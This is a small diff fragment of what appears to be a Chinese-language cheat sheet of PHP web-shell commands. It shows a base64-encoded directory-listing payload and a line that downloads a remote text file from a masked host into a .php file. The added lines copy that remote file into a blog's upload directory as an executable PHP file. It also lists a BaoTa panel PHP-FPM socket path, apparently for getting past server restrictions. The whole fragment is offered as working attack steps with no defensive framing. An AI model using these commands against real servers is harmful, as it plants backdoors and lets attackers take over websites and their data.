@@ -11,6 +11,10 @@ ZWNobyAnPHByZT4nO3Zhcl9kdW1wKHNjYW5kaXIoJy4vJykpOw==
 file_put_contents("1234.php",file_get_contents("https://a.mxxxx.com/12345.txt"));
 ```
 ```Bash
+//找可写入目录
+echo copy("https://a.mxxxx.com/12345.txt","/home/www/blog/upload/xxx.php");
+```
+```Bash
 //宝塔FPM
 /tmp/php-cgi-56.sock
 ```
